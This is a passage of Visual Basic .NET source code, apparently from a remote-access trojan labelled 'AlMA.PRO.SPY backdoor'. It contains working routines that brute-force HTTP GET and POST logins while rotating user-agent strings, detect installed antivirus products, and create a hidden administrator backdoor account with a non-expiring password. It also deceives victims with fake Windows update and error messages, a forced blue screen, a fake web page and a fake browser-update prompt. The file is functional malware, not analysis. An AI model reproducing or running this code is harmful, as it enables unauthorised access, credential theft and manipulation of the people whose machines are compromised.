                    http_parms = http_parms.Replace("^PASS^", pass)
                    Dim http_str = http_data.Split(":")(2)
                    Dim http_fail = True
                    If http_str.ToLower.StartsWith("s=") Then http_fail = False : http_str = http_str.Remove(0, 2)
                    If http_fail Then If http_str.ToLower.StartsWith("f=") Then http_str = http_str.Remove(0, 2)
                    sw.WriteLine("GET " & http_path & "?" & http_parms & " HTTP/1.1")
                    sw.Flush()
                    sw.WriteLine("HOST: " & ch)
                    sw.Flush()
                    Dim uas As String() = New String() {"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"}
                    sw.WriteLine("User-Agent: " & uas(New Random().Next(uas.Length - 1)))
                    sw.Flush()
                    sw.WriteLine("Accept-language: en-US,en,q=0.5" & vbNewLine)
                    sw.Flush()
                    Dim b(9999) As Byte
                    ns.Read(b, 0, b.Length)
                    Dim sdata = BS(b)
                    If sdata.ToLower.Contains(http_str) Then
                        If Not http_fail Then
                            cp = pass : Return True
                        End If
                    Else
                        If http_fail Then
                            cp = pass : Return True
                        End If
                    End If
#End Region
#Region "HTTP/S Cracking - post"
                Case 5
                    sp = IIf(sp = "", 80, sp)
                    Dim sssl = False
                    If sh.ToLower.StartsWith("https") Then sp = "443" : sssl = True
                    Dim ch = sh.Replace("https", "")
                    ch = ch.Replace("http", "")
                    ch = ch.Replace("://", "")
                    ch = ch.Split("/")(0)
                    CONS(ch, sp, ns, sw, sssl)
                    Dim http_path = http_data.Split(":")(0)
                    Dim http_parms = http_data.Split(":")(1)
                    http_parms = http_parms.Replace("^USER^", user)
                    http_parms = http_parms.Replace("^PASS^", pass)
                    Dim http_str = http_data.Split(":")(2)
                    Dim http_fail = True
                    If http_str.ToLower.StartsWith("s=") Then http_fail = False : http_str = http_str.Remove(0, 2)
                    If http_fail Then If http_str.ToLower.StartsWith("f=") Then http_str = http_str.Remove(0, 2)
                    sw.WriteLine("POST " & http_path & " HTTP/1.1")
                    sw.Flush()
                    sw.WriteLine("HOST: " & ch)
                    sw.Flush()
                    Dim uas As String() = New String() {"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"}
                    sw.WriteLine("User-Agent: " & uas(New Random().Next(uas.Length - 1)))
                    sw.Flush()
                    sw.WriteLine("Accept-language: en-US,en,q=0.5")
                    sw.Flush()
                    sw.WriteLine("Content-Type: application/x-www-form-urlencoded")
                    sw.Flush()
                    sw.WriteLine("Content-length: " & http_parms.Length & vbNewLine)
                    sw.Flush()
                    sw.WriteLine(http_parms & vbNewLine)
                    sw.Flush()
                    Dim b(9999) As Byte
                    ns.Read(b, 0, b.Length)
                    Dim sdata = BS(b)
                    If sdata.ToLower.Contains(http_str) Then
                        If Not http_fail Then
                            cp = pass : Return True
                        End If
                    Else
                        If http_fail Then
                            cp = pass : Return True
                        End If
                    End If
            End Select
#End Region
        Next
    End Function ' CrackOff.
    Sub CONS(h As String, p As String, ByRef ns As IO.Stream, ByRef sw As IO.StreamWriter, ssl As Boolean)
        Dim coc = New Net.Sockets.TcpClient(h, p)
        If ssl Then
            Dim nss As Net.Security.SslStream = New Net.Security.SslStream(coc.GetStream)
            nss.AuthenticateAsClient(h)
            ns = nss
            sw = New IO.StreamWriter(ns)
        Else
            ns = coc.GetStream
            sw = New IO.StreamWriter(ns)
        End If
    End Sub ' Some connection preparing function that I don't remember it 0.0
    Function AVD(ByRef avs As List(Of String)) As Boolean
        AVD = False
        Try
            Dim scope As New ManagementScope("\\.\root\SecurityCenter")
            Dim searcher As New ManagementObjectSearcher("SELECT * FROM antivirusproduct")
            Dim arInst As New List(Of String)
            searcher.Scope = scope
            Dim av As ManagementObjectCollection = searcher.Get()
            Dim Enumerator As ManagementObjectCollection.
            ManagementObjectEnumerator = av.GetEnumerator()
            While Enumerator.MoveNext
                Dim avp As ManagementObject = CType(Enumerator.Current, ManagementObject)
                avs.Add(avp("displayName").ToString)
            End While
            If avs.Count > 0 Then Return True
        Catch ex As Exception
            log_all("AVD function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Anti-Virus Detect.
    Function AddUser(ByVal login As String, ByVal password As String, ByVal fullName As String) As Boolean
        AddUser = False
        Try
            Dim dirEntry As DirectoryEntry
            dirEntry = New DirectoryEntry("WinNT://" + Environment.MachineName + ",computer")
            Dim entries As DirectoryEntries = dirEntry.Children
            Dim newUser As DirectoryEntry = entries.Add(login, "User")
            newUser.Properties("FullName").Add(fullName)
            newUser.Properties("Description").Add("AlMA.PRO.SPY backdoor user.")
            newUser.Properties("PasswordExpired").Add(0)
            newUser.Properties("Userflags").Add(&H40 Or &H10000)
            Dim result As Object = newUser.Invoke("SetPassword", password)
            newUser.CommitChanges()
            Dim grp As DirectoryEntry = dirEntry.Children.Find("Users", "group")
            If (Not grp Is Nothing) Then
                grp.Invoke("Add", New Object() {newUser.Path.ToString()})
                Dim grp1 As DirectoryEntry = dirEntry.Children.Find("Administrators", "group")
                If (Not grp1 Is Nothing) Then
                    grp1.Invoke("Add", New Object() {newUser.Path.ToString()})
                End If
                Return True
            End If
        Catch ex As Exception
            log_all("AddUser function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Add a user.
    Function RemoveUser(login As String) As Boolean
        RemoveUser = False
        Try
            Dim dirEntry As DirectoryEntry
            dirEntry = New DirectoryEntry("WinNT://" + Environment.MachineName + ",computer")
            Dim entries As DirectoryEntries = dirEntry.Children
            entries.Remove(entries.Find(login))
            Return True
        Catch ex As Exception
            log_all("RemoveUser function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Function ' Remove a user.
    Enum SEV_Trick
        MSGBOX = 0
        UpdateMSGBOX = 1
        ErrorMSGBox = 2
        BlueScreenOfDeath = 3
        FakeWebsitePage = 4
        FakeBrowserUpdate = 5
    End Enum ' Social Engineering tricks.
    Sub SEV(tc As String, Optional ty As SEV_Trick = SEV_Trick.MSGBOX)
        Try
            Select Case ty
                Case SEV_Trick.MSGBOX
                    MsgBox(tc)
                Case SEV_Trick.UpdateMSGBOX
                    MsgBox("Your Windows machine needs updating!" & vbNewLine & "Please save all your work before clicking OK" & vbNewLine & "(Just in case Windows restarts).", MsgBoxStyle.Exclamation, "Windows Update")
                Case SEV_Trick.ErrorMSGBox
                    Process.Start("explorer", """https://www.google.com/search?q=00F40EG5 - unknown error""")
                    MsgBox("There was an error!" & vbNewLine & "#00F40EG5 - Unknown error.", MsgBoxStyle.Critical, "Windows")
                Case SEV_Trick.BlueScreenOfDeath
                    If CH() Then mBlueScreen.BSOD()
                Case SEV_Trick.FakeWebsitePage
                    Dim pc = ""
                    Dim pt = ""
                    If tc.Contains("|") Then
                        pt = tc.Split("|")(0)
                        pc = tc.Split("|")(1)
                    Else
                        pc = tc
                    End If
                    Dim pp = Environment.GetFolderPath(Environment.SpecialFolder.Cookies) & "\fwsp.html"
                    IO.File.WriteAllText(pp, My.Resources.fwsp.Replace("^BODY^", pc).Replace("^TTL^", pt))
                    Process.Start("explorer", """file:///" & pp & """")
                    Threading.Thread.Sleep(1000)
                    IO.File.Delete(pp)
                Case SEV_Trick.FakeBrowserUpdate
                    Dim bp As Process = Nothing
                    For Each p In Process.GetProcessesByName("firefox")
                        bp = p : Exit For
                    Next
                    For Each p In Process.GetProcessesByName("Chrome")
                        bp = p : Exit For
                    Next
                    For Each p In Process.GetProcessesByName("opera")
                        bp = p : Exit For
                    Next
                    If bp IsNot Nothing Then
                        MsgBox(bp.ProcessName & " needs updating...." & vbNewLine & "Please allow any further oprations.", MsgBoxStyle.Information, "Browser update")
                    End If
            End Select
        Catch ex As Exception
            log_all("SEV function: " & ex.Message & vbNewLine & ex.StackTrace)
        End Try
    End Sub ' Social Engineer victim.
End Module